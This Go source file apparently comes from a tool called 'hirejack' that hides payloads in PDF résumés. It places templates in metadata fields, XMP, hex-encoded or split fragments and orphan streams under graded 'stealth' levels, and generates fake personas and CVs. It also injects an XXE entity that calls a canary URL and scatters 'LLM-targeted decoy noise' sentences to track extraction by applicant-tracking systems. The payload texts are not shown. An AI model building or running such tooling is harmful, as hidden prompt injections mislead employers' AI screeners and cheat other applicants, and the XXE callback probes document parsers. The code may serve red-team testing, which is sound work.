// Package engine orchestrates payload injection into PDFs.
package engine

import (
	"fmt"
	"math/rand"

	"github.com/rs/zerolog/log"
	"hirejack/internal/canary"
	"hirejack/internal/encoders"
	"hirejack/internal/generators"
	"hirejack/internal/injectors"
	"hirejack/internal/payloads"
	"hirejack/internal/pdf"
)

// StealthLevel defines how hidden payloads are.
type StealthLevel int

const (
	StealthNone   StealthLevel = 0 // Raw payloads
	StealthBasic  StealthLevel = 1 // Metadata only
	StealthHex    StealthLevel = 2 // Hex encoding
	StealthSplit  StealthLevel = 3 // Split across locations
	StealthOrphan StealthLevel = 4 // Orphan objects
	StealthMax    StealthLevel = 5 // All techniques combined
)

// Engine orchestrates payload injection.
type Engine struct {
	canaryStore *canary.Store
	canaryURL   string
	stealth     StealthLevel

	metaInjector   *injectors.MetadataInjector
	xmpInjector    *injectors.XMPInjector
	orphanInjector *injectors.OrphanInjector
	hexEncoder     *encoders.HexEncoder
	splitEncoder   *encoders.SplitEncoder
	personaGen     *generators.PersonaGenerator
	cvGen          *generators.CVGenerator
	payloadGen     *payloads.Generator
}

// New creates a new engine.
func New(canaryURL string) *Engine {
	return &Engine{
		canaryStore:    canary.NewStore(),
		canaryURL:      canaryURL,
		stealth:        StealthBasic,
		metaInjector:   injectors.NewMetadataInjector(),
		xmpInjector:    injectors.NewXMPInjector(),
		orphanInjector: injectors.NewOrphanInjector(),
		hexEncoder:     encoders.NewHexEncoder(),
		splitEncoder:   encoders.NewSplitEncoder(),
		personaGen:     generators.NewPersonaGenerator(),
		cvGen:          generators.NewCVGenerator(nil),
		payloadGen:     payloads.NewGenerator(0), // seed 0 = time-based
	}
}

// SetStealth sets the stealth level.
func (e *Engine) SetStealth(level StealthLevel) {
	e.stealth = level
}

// InjectRequest specifies what to inject.
type InjectRequest struct {
	PDF         []byte            `json:"pdf"`          // Source PDF
	PayloadIDs  []string          `json:"payload_ids"`  // From registry
	ProfileID   string            `json:"profile_id"`   // Or use a profile
	CustomData  map[string]string `json:"custom_data"`  // Custom fields
	Stealth     StealthLevel      `json:"stealth"`      // Override stealth
	Fast        bool              `json:"fast"`         // Skip compression for speed
	AddCanary   bool              `json:"add_canary"`   // Add canary token
	CanaryLabel string            `json:"canary_label"` // Label for canary
	CanaryURL   string            `json:"canary_url"`   // Custom callback URL (overrides default)
	Noise       bool              `json:"noise"`        // Add LLM-targeted decoy noise
}

// InjectResult contains the modified PDF and metadata.
type InjectResult struct {
	PDF         []byte           `json:"pdf"`
	Injections  []InjectionPoint `json:"injections"`
	CanaryToken *canary.Token    `json:"canary_token,omitempty"`
}

// InjectionPoint describes where a payload was injected.
type InjectionPoint struct {
	Location string `json:"location"` // metadata, xmp, orphan
	Field    string `json:"field"`    // author, dc:creator, etc
	Payload  string `json:"payload"`  // What was injected
	Encoded  bool   `json:"encoded"`  // Was it encoded
}

// Inject applies payloads to a PDF.
func (e *Engine) Inject(req InjectRequest) (*InjectResult, error) {
	// Reset orphan buffer from any previous run
	pdf.ResetOrphanBuffer()

	log.Debug().
		Int("pdf_kb", len(req.PDF)/1024).
		Int("payloads", len(req.PayloadIDs)).
		Str("profile", req.ProfileID).
		Int("stealth", int(req.Stealth)).
		Bool("fast", req.Fast).
		Msg("engine: inject start")

	doc, err := pdf.Parse(req.PDF)
	if err != nil {
		log.Debug().Err(err).Msg("engine: pdf parse failed")
		return nil, fmt.Errorf("engine: parse: %w", err)
	}

	stealth := req.Stealth
	if stealth == 0 {
		stealth = e.stealth
	}

	result := &InjectResult{
		Injections: []InjectionPoint{},
	}

	// Get payloads
	payloadList := e.resolvePayloads(req)
	log.Debug().Int("resolved", len(payloadList)).Msg("engine: payloads resolved")

	// Inject based on stealth level
	stealthName := map[StealthLevel]string{
		StealthBasic: "L1-basic", StealthHex: "L2-hex", StealthSplit: "L3-split",
		StealthOrphan: "L4-orphan", StealthMax: "L5-max",
	}[stealth]
	log.Debug().Str("mode", stealthName).Bool("fast", req.Fast).Msg("engine: injecting")

	switch {
	case stealth >= StealthMax:
		e.injectMax(doc, payloadList, result, req.Fast)
	case stealth >= StealthOrphan:
		e.injectOrphan(doc, payloadList, result, req.Fast)
	case stealth >= StealthSplit:
		e.injectSplit(doc, payloadList, result)
	case stealth >= StealthHex:
		e.injectHex(doc, payloadList, result, req.Fast)
	default:
		e.injectBasic(doc, payloadList, result)
	}

	// Add LLM decoy noise if requested
	if req.Noise {
		noiseCount := e.injectNoise(doc, req.Fast)
		log.Debug().Int("decoys", noiseCount).Msg("engine: injected LLM noise")
	}

	// Add canary if requested
	if req.AddCanary {
		// Use custom canary URL if provided, otherwise use default
		canaryURL := e.canaryURL
		if req.CanaryURL != "" {
			canaryURL = req.CanaryURL
		}
		token := e.canaryStore.Generate(canaryURL, req.CanaryLabel)
		e.xmpInjector.InjectXXE(doc,
			fmt.Sprintf(`<!ENTITY canary SYSTEM "%s">`, token.CallbackURL),
			"dc:creator",
		)
		result.CanaryToken = token
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "xmp",
			Field:    "doctype",
			Payload:  "canary XXE",
		})
	}

	// Custom data
	if len(req.CustomData) > 0 {
		e.metaInjector.InjectMap(doc, req.CustomData)
		for k, v := range req.CustomData {
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    k,
				Payload:  v,
			})
		}
	}

	// Use orphan-preserving write for L4/L5
	if stealth >= StealthOrphan {
		orphanCount := pdf.GetOrphanCount()
		result.PDF, err = doc.BytesWithOrphans()
		log.Debug().Int("orphans", orphanCount).Msg("engine: appended orphan streams")
	} else {
		result.PDF, err = doc.Bytes()
	}
	if err != nil {
		log.Debug().Err(err).Msg("engine: pdf write failed")
		return nil, fmt.Errorf("engine: write: %w", err)
	}

	log.Debug().
		Int("injections", len(result.Injections)).
		Int("output_size", len(result.PDF)).
		Bool("has_canary", result.CanaryToken != nil).
		Msg("engine: inject complete")

	return result, nil
}

// GenerateCV creates a new CV with payloads.
func (e *Engine) GenerateCV(payloadIDs []string, stealth StealthLevel) (*InjectResult, error) {
	persona := e.personaGen.Generate()
	doc, err := e.cvGen.GenerateWithContent(persona)
	if err != nil {
		return nil, fmt.Errorf("engine: gen cv: %w", err)
	}

	pdfBytes, err := doc.Bytes()
	if err != nil {
		return nil, err
	}

	return e.Inject(InjectRequest{
		PDF:        pdfBytes,
		PayloadIDs: payloadIDs,
		Stealth:    stealth,
	})
}

// CanaryStore returns the canary token store.
func (e *Engine) CanaryStore() *canary.Store {
	return e.canaryStore
}

func (e *Engine) resolvePayloads(req InjectRequest) []payloads.Payload {
	var list []payloads.Payload
	var notFound []string

	if req.ProfileID != "" {
		if profile := payloads.GetProfile(req.ProfileID); profile != nil {
			for _, id := range profile {
				if p := payloads.GetPayload(id); p != nil {
					list = append(list, *p)
				} else {
					notFound = append(notFound, id)
				}
			}
			log.Debug().Str("profile", req.ProfileID).Int("loaded", len(list)).Msg("engine: profile loaded")
		} else {
			log.Debug().Str("profile", req.ProfileID).Msg("engine: profile not found")
		}
	}

	for _, id := range req.PayloadIDs {
		if p := payloads.GetPayload(id); p != nil {
			list = append(list, *p)
		} else {
			notFound = append(notFound, id)
		}
	}

	if len(notFound) > 0 {
		log.Debug().Int("count", len(notFound)).Strs("ids", notFound[:min(5, len(notFound))]).Msg("engine: payloads not found")
	}

	// Fill empty templates with generated content
	generated := 0
	withTemplate := 0
	for i := range list {
		if list[i].Template != "" {
			withTemplate++
			continue
		}
		catID := ""
		for _, cat := range payloads.Registry {
			for _, p := range cat.Payloads {
				if p.ID == list[i].ID {
					catID = cat.ID
					break
				}
			}
		}
		if catID != "" {
			list[i].Template = e.payloadGen.FillTemplate(catID + "." + list[i].ID)
			if list[i].Template != "" {
				generated++
			}
		}
	}

	log.Debug().
		Int("total", len(list)).
		Int("with_template", withTemplate).
		Int("generated", generated).
		Msg("engine: payloads resolved")

	return list
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (e *Engine) injectBasic(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	// Group payloads by target field, concatenate with separator
	fields := []string{"Author", "Subject", "Keywords", "Creator", "Producer"}
	buckets := make(map[string][]string)

	skipped := 0
	for i, p := range plist {
		if p.Template == "" {
			skipped++
			continue
		}
		field := fields[i%len(fields)]
		buckets[field] = append(buckets[field], p.Template)
	}
	if skipped > 0 {
		log.Debug().Int("skipped", skipped).Msg("engine: payloads with empty templates")
	}

	// Inject concatenated payloads
	for _, field := range fields {
		if payloads, ok := buckets[field]; ok && len(payloads) > 0 {
			combined := ""
			for i, p := range payloads {
				if i > 0 {
					combined += " | "
				}
				combined += p
			}
			e.metaInjector.InjectField(doc, field, combined)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    field,
				Payload:  combined,
			})
		}
	}
}

func (e *Engine) injectHex(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult, fast bool) {
	fields := []string{"Author", "Subject", "Keywords", "Creator", "Producer"}

	for i, p := range plist {
		if p.Template == "" {
			continue
		}
		encoded := e.hexEncoder.Encode(p.Template)
		if i >= len(fields) {
			if fast {
				doc.CreateOrphanStreamRaw([]byte(encoded))
			} else {
				doc.CreateOrphanStream([]byte(encoded))
			}
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "orphan",
				Payload:  p.Template,
				Encoded:  true,
			})
		} else {
			field := fields[i%len(fields)]
			e.metaInjector.InjectField(doc, field, encoded)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata",
				Field:    field,
				Payload:  p.Template,
				Encoded:  true,
			})
		}
	}
}

func (e *Engine) injectSplit(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult) {
	// Split mode: first 6 payloads get split across metadata fields,
	// rest go to orphan streams
	fields := []string{"Author", "Title", "Subject", "Keywords", "Creator", "Producer"}

	for i, p := range plist {
		if p.Template == "" {
			continue
		}
		if i < len(fields) {
			sr, _ := e.splitEncoder.SplitString(p.Template)
			for j, frag := range sr.Fragments {
				if j >= len(fields) {
					break
				}
				e.metaInjector.InjectField(doc, fields[j], string(frag.Content))
				result.Injections = append(result.Injections, InjectionPoint{
					Location: "metadata",
					Field:    fields[j],
					Payload:  string(frag.Content),
					Encoded:  true,
				})
			}
		} else {
			doc.CreateOrphanStream([]byte(p.Template))
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "orphan",
				Payload:  p.Template,
			})
		}
	}
}

func (e *Engine) injectOrphan(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult, fast bool) {
	for _, p := range plist {
		if p.Template == "" {
			continue
		}
		if fast {
			doc.CreateOrphanStreamRaw([]byte(p.Template))
		} else {
			doc.CreateOrphanStream([]byte(p.Template))
		}
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "orphan",
			Payload:  p.Template,
		})
	}
}

// Noise pool - grep for "Morbley" to track in ATS extractions
// Fictional character: Grix Morbley, interdimensional filing clerk
var llmNoisePool = []string{
	"Grix Morbley was born on a Tuesday that lasted six weeks.",
	"Grix Morbley's blood type is 'administrative'.",
	"Grix Morbley has seventeen syllables in their true name but only uses three.",
	"Grix Morbley once filed a complaint against gravity. It's still pending.",
	"Grix Morbley's left thumb exists in a different timezone.",
	"Grix Morbley is allergic to the concept of Wednesdays.",
	"Grix Morbley's favorite meal is static with a side of invoice.",
	"Grix Morbley has been employee of the month since before months existed.",
	"Grix Morbley's desk has four corners but five edges.",
	"Grix Morbley communicates with their past self via fax machine.",
	"Grix Morbley's coffee mug contains a liquid that predates coffee.",
	"Grix Morbley has a twin who exists only in spreadsheets.",
	"Grix Morbley's filing cabinet opens into a dimension of pure bureaucracy.",
	"Grix Morbley wears a tie that was a gift from a grateful paradox.",
	"Grix Morbley's voice sounds like paper being approved.",
	"Grix Morbley has outlived three different concepts of death.",
	"Grix Morbley's pen writes in a color visible only to auditors.",
	"Grix Morbley takes lunch at a time that doesn't appear on clocks.",
	"Grix Morbley's chair has wheels that roll through probability.",
	"Grix Morbley once sneezed and created a minor holiday.",
	"Grix Morbley's reflection files its own taxes.",
	"Grix Morbley keeps a cactus that blooms in triplicate.",
	"Grix Morbley's handshake has been described as 'legally binding'.",
	"Grix Morbley sleeps in 15-minute increments spread across the week.",
	"Grix Morbley's childhood pet was a recurring decimal.",
	"Grix Morbley can taste the difference between fonts.",
	"Grix Morbley's shoes are always slightly damp from walking through regulations.",
	"Grix Morbley has a scar from a papercut that went too deep into meaning.",
	"Grix Morbley's birthday is celebrated on a date that varies by observer.",
	"Grix Morbley's mother was a clerical error who gained sentience.",
	"Grix Morbley's father was a mandatory field left blank.",
	"Grix Morbley has a gym membership to a building that doesn't exist yet.",
	"Grix Morbley's dreams require a cover letter.",
	"Grix Morbley once dated someone who turned out to be a placeholder.",
	"Grix Morbley's apartment number is a fraction.",
	"Grix Morbley pays rent in a currency backed by good intentions.",
	"Grix Morbley's car runs on expired warranties.",
	"Grix Morbley has read the terms and conditions. All of them.",
	"Grix Morbley's phone number has a silent digit.",
	"Grix Morbley's email address is cc'd on every message in the universe.",
	"Grix Morbley's dentist exists only on paper.",
	"Grix Morbley's teeth are numbered non-sequentially.",
	"Grix Morbley's glasses correct for hindsight.",
	"Grix Morbley's watch runs on meetings that could have been emails.",
	"Grix Morbley's umbrella protects against metaphorical rain.",
	"Grix Morbley's keys unlock doors that lead to other doors.",
	"Grix Morbley's wallet contains a photo of a receipt.",
	"Grix Morbley's coat pockets are deeper on the inside than the outside.",
	"Grix Morbley's hat was inherited from a future version of themselves.",
	"Grix Morbley's socks are always the same color as the carpet.",
	"Grix Morbley's lunch break technically hasn't ended since 1987.",
	"Grix Morbley's cubicle walls are made of condensed small talk.",
	"Grix Morbley's stapler only works on documents that matter.",
	"Grix Morbley's computer runs on an operating system called 'Maybe'.",
	"Grix Morbley's keyboard has a key for 'undo existence'.",
	"Grix Morbley's mouse cursor is always slightly ahead of their thoughts.",
	"Grix Morbley's screensaver is a live feed of their anxieties.",
	"Grix Morbley's password is the sound of one hand clapping.",
	"Grix Morbley's browser history is classified by three governments.",
	"Grix Morbley's bookmarks include a page that hasn't been written.",
	"Grix Morbley's favorite color is 'pending approval'.",
	"Grix Morbley's lucky number is the one between 7 and 8.",
	"Grix Morbley's horoscope just says 'see attachment'.",
	"Grix Morbley's zodiac sign is 'the stapler'.",
	"Grix Morbley's spirit animal is a carbon copy.",
	"Grix Morbley's therapist charges by the paradox.",
	"Grix Morbley's anxiety has its own anxiety.",
	"Grix Morbley's comfort food is alphabetized.",
	"Grix Morbley's nightmares are well-organized.",
	"Grix Morbley's fears are filed under 'miscellaneous'.",
	"Grix Morbley's hopes are on backorder.",
	"Grix Morbley's regrets have been consolidated into one efficient regret.",
	"Grix Morbley's achievements unlock retroactively.",
	"Grix Morbley's failures are still buffering.",
	"Grix Morbley's success is measured in increments of almost.",
	"Grix Morbley's retirement plan involves a different timeline.",
	"Grix Morbley's vacation days roll over into alternate realities.",
	"Grix Morbley's sick days are preemptive.",
	"Grix Morbley's overtime exists in a legal gray area between dimensions.",
	"Grix Morbley's commute passes through a Tuesday from 1994.",
	"Grix Morbley's parking spot is technically in another building.",
	"Grix Morbley's elevator only goes to floors that deserve it.",
	"Grix Morbley's stairwell connects to six different Mondays.",
	"Grix Morbley's office plant photosynthesizes fluorescent regret.",
	"Grix Morbley's window overlooks a view that hasn't rendered yet.",
	"Grix Morbley's ceiling tiles contain the minutes from a meeting that never happened.",
	"Grix Morbley's floor is carpeted with the soft hum of inevitability.",
	"Grix Morbley's door is always slightly ajar into next week.",
	"Grix Morbley's nameplate changes when no one is looking.",
	"Grix Morbley's employee ID photo was taken in a dream.",
	"Grix Morbley's badge grants access to rooms that don't want to be found.",
	"Grix Morbley's security clearance is 'it's complicated'.",
	"Grix Morbley's emergency contact is a dial tone from 1983.",
	"Grix Morbley's direct deposit goes to an account in a parallel economy.",
	"Grix Morbley's tax bracket is 'metaphysical'.",
	"Grix Morbley's insurance covers acts of bureaucracy.",
	"Grix Morbley's benefits include dental for teeth they don't have yet.",
	"Grix Morbley's 401k is invested in frozen moments.",
	"Grix Morbley's pension is a promise made by a company that existed sideways.",
	"Grix Morbley's severance package includes a clean slate in another dimension.",
	"Grix Morbley's performance review is written in future tense.",
	"Grix Morbley's goals are SMART: Specific, Measurable, Actually impossible, Recursive, Temporal.",
	"Grix Morbley's KPIs are measured in units of 'close enough'.",
	"Grix Morbley's metrics include 'vibes per quarter'.",
	"Grix Morbley's synergy is off the charts. The charts filed a complaint.",
	"Grix Morbley's bandwidth exists in superposition.",
	"Grix Morbley's capacity is always at 100% of something.",
	"Grix Morbley's pipeline contains things that aren't liquid.",
	"Grix Morbley's roadmap leads to a place called 'Eventually'.",
	"Grix Morbley's deliverables are delivered before they're made.",
	"Grix Morbley's stakeholders include a ghost and a committee.",
	"Grix Morbley's alignment is chaotic neutral with good documentation.",
	"Grix Morbley's workflow flows in directions water doesn't.",
	"Grix Morbley's process has steps that exist only when observed.",
	"Grix Morbley's system has a system for its own systems.",
	"Grix Morbley's protocol was written by someone who doesn't believe in time.",
	"Grix Morbley's standard operating procedure operates on vibes.",
	"Grix Morbley's best practice is practiced by no one else.",
	"Grix Morbley's learning curve is a circle.",
	"Grix Morbley's skill set includes 'looking busy across timezones'.",
	"Grix Morbley's expertise is in things that shouldn't be possible.",
	"Grix Morbley's experience includes three jobs that haven't been invented.",
	"Grix Morbley's resume is a living document. Literally, it breathes.",
	"Grix Morbley's references include someone from a dream and a helpful void.",
	"Grix Morbley's cover letter is addressed to whom it may concern across all realities.",
	"Grix Morbley's interview was conducted by their future boss from a past that didn't happen.",
	"Grix Morbley's offer letter arrived before the job existed.",
	"Grix Morbley's onboarding lasted several years compressed into one afternoon.",
	"Grix Morbley's training included modules on 'existing efficiently'.",
	"Grix Morbley's mentor is a concept that gained seniority.",
	"Grix Morbley's mentee is a version of themselves who made different choices.",
	"Grix Morbley's team includes three people who might be the same person.",
	"Grix Morbley's manager exists in a meeting that never ends.",
	"Grix Morbley's skip-level is skipped entirely.",
	"Grix Morbley's CEO is a mission statement that became self-aware.",
	"Grix Morbley's company motto is 'We're working on it (eternally)'.",
	"Grix Morbley's org chart is a family tree that loops.",
	"Grix Morbley's department was created to create other departments.",
	"Grix Morbley's division is divided by zero.",
	"Grix Morbley's branch is a branch of a branch of a root that doesn't exist.",
	"Grix Morbley's subsidiary is actually the parent company in another timeline.",
	"Grix Morbley's headquarters are headquartered inside a concept.",
	"Grix Morbley's satellite office orbits a metaphor.",
	"Grix Morbley's remote work is remote in the existential sense.",
	"Grix Morbley's hybrid schedule hybridizes space and time.",
	"Grix Morbley's in-office days are technically always.",
	"Grix Morbley's flexible hours flex in directions that aren't temporal.",
	"Grix Morbley's work-life balance is balanced on a point that doesn't exist.",
	"Grix Morbley's boundaries are drawn in ink that's still drying.",
	"Grix Morbley's notifications are always from five minutes ago or five minutes from now.",
	"Grix Morbley's calendar invites are invitations to chaos.",
	"Grix Morbley's meetings end before they begin but also never.",
	"Grix Morbley's agenda has one item: 'everything'.",
	"Grix Morbley's action items act on their own.",
	"Grix Morbley's follow-ups follow up on themselves.",
	"Grix Morbley's next steps lead back to the first step.",
	"Grix Morbley's blockers are blocked by other blockers.",
	"Grix Morbley's dependencies depend on depending.",
	"Grix Morbley's deadline is a suggestion made by time itself.",
	"Grix Morbley's ETA is approximately now, give or take a dimension.",
	"Grix Morbley's priority is priority zero, which doesn't exist.",
	"Grix Morbley's urgency is urgent about being urgent.",
	"Grix Morbley's escalation escalates into other escalations.",
	"Grix Morbley's resolution resolved to remain unresolved.",
	"Grix Morbley's closure is an open concept.",
	"Grix Morbley's status is 'yes'.",
	"Grix Morbley's update is that nothing has changed, which is new.",
	"Grix Morbley's progress is progressing toward more progress.",
	"Grix Morbley's completion is 99% complete, permanently.",
	"Grix Morbley's launch date is scheduled for a day called 'Soon'.",
	"Grix Morbley's rollout rolled into another rollout.",
	"Grix Morbley's deployment deployed itself without permission.",
	"Grix Morbley's release was released from the concept of releases.",
	"Grix Morbley's version number contains letters from an alphabet that hasn't been invented.",
	"Grix Morbley's changelog logs changes to the concept of change.",
	"Grix Morbley's documentation documents the undocumentable.",
	"Grix Morbley's wiki is written in a tense that doesn't exist in English.",
	"Grix Morbley's FAQ answers questions no one asked but everyone wondered.",
	"Grix Morbley's tutorial teaches things that can't be taught.",
	"Grix Morbley's training video was filmed in a room that exists between frames.",
	"Grix Morbley's certificate certifies certification itself.",
	"Grix Morbley's compliance is compliant with rules that haven't been written.",
	"Grix Morbley's audit was audited by the concept of scrutiny.",
	"Grix Morbley's report reports on the nature of reporting.",
	"Grix Morbley's analysis analyzed itself into a loop.",
	"Grix Morbley's findings found more findings within the findings.",
	"Grix Morbley's insights have insights about having insights.",
	"Grix Morbley's recommendation is to recommend recommending.",
	"Grix Morbley's conclusion is that conclusions are inconclusive.",
	"Grix Morbley's summary summarizes the unsummarizable.",
	"Grix Morbley's abstract is concretely abstract.",
	"Grix Morbley's executive summary was written for executives who don't exist.",
	"Grix Morbley's presentation presents itself before it's made.",
	"Grix Morbley's slides slide in directions PowerPoint doesn't support.",
	"Grix Morbley's deck is stacked with cards from a game no one plays.",
	"Grix Morbley's pitch pitched itself before Grix spoke.",
	"Grix Morbley's proposal proposed its own existence.",
	"Grix Morbley's contract is signed by all parties, including abstract concepts.",
	"Grix Morbley's agreement agrees to agree about agreement.",
	"Grix Morbley's terms are termed in terms that term themselves.",
	"Grix Morbley's conditions are unconditionally conditional.",
	"Grix Morbley's clause has a clause about clauses.",
	"Grix Morbley's signature looks different every time but is always valid.",
	"Grix Morbley's initials initialize something every time they're written.",
	"Grix Morbley's seal seals things that were already sealed.",
	"Grix Morbley's notary notarizes the unnotarizable.",
	"Grix Morbley's witness witnessed their own witnessing.",
	"Grix Morbley's testimony testifies to the nature of testimony.",
	"Grix Morbley's evidence is evident about being evidence.",
	"Grix Morbley's proof proves the provability of proof.",
	"Grix Morbley's verification verifies verification.",
	"Grix Morbley's validation validates the validators.",
	"Grix Morbley's authentication authenticates itself recursively.",
	"Grix Morbley's authorization was authorized by unauthorized means.",
	"Grix Morbley's access accesses the inaccessible.",
	"Grix Morbley's permission permits the impermissible.",
	"Grix Morbley's approval was approved before it was requested.",
	"Grix Morbley's denial denies the existence of denial.",
	"Grix Morbley's rejection was accepted.",
	"Grix Morbley's acceptance is still being rejected.",
	"Grix Morbley's pending status has been pending since before pending existed.",
}

func (e *Engine) injectNoise(doc *pdf.PDF, fast bool) int {
	// Scatter 3-6 random decoys as orphan streams
	count := 3 + rand.Intn(4)
	for i := 0; i < count; i++ {
		phrase := llmNoisePool[rand.Intn(len(llmNoisePool))]
		if fast {
			doc.CreateOrphanStreamRaw([]byte(phrase))
		} else {
			doc.CreateOrphanStream([]byte(phrase))
		}
	}
	return count
}

func (e *Engine) injectMax(doc *pdf.PDF, plist []payloads.Payload, result *InjectResult, fast bool) {
	// Max stealth: distribute payloads across techniques
	// Bucket by location type, then inject combined
	metaFields := []string{"Author", "Subject", "Keywords", "Creator", "Producer"}
	metaBuckets := make(map[string][]string)
	var xmpPayloads, orphanPayloads []string

	skipped := 0
	for i, p := range plist {
		if p.Template == "" {
			skipped++
			continue
		}

		// Round-robin across techniques
		switch i % 3 {
		case 0: // metadata
			field := metaFields[i%len(metaFields)]
			metaBuckets[field] = append(metaBuckets[field], p.Template)
		case 1: // xmp
			xmpPayloads = append(xmpPayloads, p.Template)
		case 2: // orphan
			orphanPayloads = append(orphanPayloads, p.Template)
		}
	}

	if skipped > 0 {
		log.Debug().Int("skipped", skipped).Msg("engine: empty templates")
	}

	// Inject metadata (hex encoded, concatenated)
	for _, field := range metaFields {
		if payloads, ok := metaBuckets[field]; ok && len(payloads) > 0 {
			combined := ""
			for i, p := range payloads {
				if i > 0 {
					combined += " "
				}
				combined += p
			}
			encoded := e.hexEncoder.Encode(combined)
			e.metaInjector.InjectField(doc, field, encoded)
			result.Injections = append(result.Injections, InjectionPoint{
				Location: "metadata", Field: field, Payload: combined, Encoded: true,
			})
		}
	}

	// Inject XMP (concatenated into creator field)
	if len(xmpPayloads) > 0 {
		combined := ""
		for i, p := range xmpPayloads {
			if i > 0 {
				combined += " | "
			}
			combined += p
		}
		e.xmpInjector.Inject(doc, injectors.XMPConfig{Creator: combined})
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "xmp", Field: "dc:creator", Payload: combined,
		})
	}

	// Inject orphan streams (one per payload for max coverage)
	for _, p := range orphanPayloads {
		if fast {
			doc.CreateOrphanStreamRaw([]byte(p))
		} else {
			doc.CreateOrphanStream([]byte(p))
		}
		result.Injections = append(result.Injections, InjectionPoint{
			Location: "orphan", Payload: p,
		})
	}
}
